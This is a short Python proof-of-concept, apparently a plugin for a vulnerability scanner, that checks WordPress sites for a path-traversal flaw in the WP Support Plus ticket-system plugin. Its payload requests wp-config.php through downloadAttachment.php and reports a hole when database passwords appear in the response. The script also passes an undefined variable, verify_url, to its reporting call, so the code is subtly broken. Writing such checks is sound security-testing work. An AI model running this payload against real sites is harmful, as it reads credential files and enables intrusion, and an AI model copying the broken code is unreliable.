#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '0x3D'

def assign(service, arg):
	if service == 'wordpress':
		return True, arg

def audit(arg):
	url = arg
	payload = '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php'
	addr = arg + payload
	_, _, res, _, _ = curl.curl(addr)
	if 'DB_PASSWORD' in res:
		security_hole(verify_url)

if __name__ == '__main__':
	from dummy import *
	audit(assign('wordpress', 'http://www.example.com/')[1])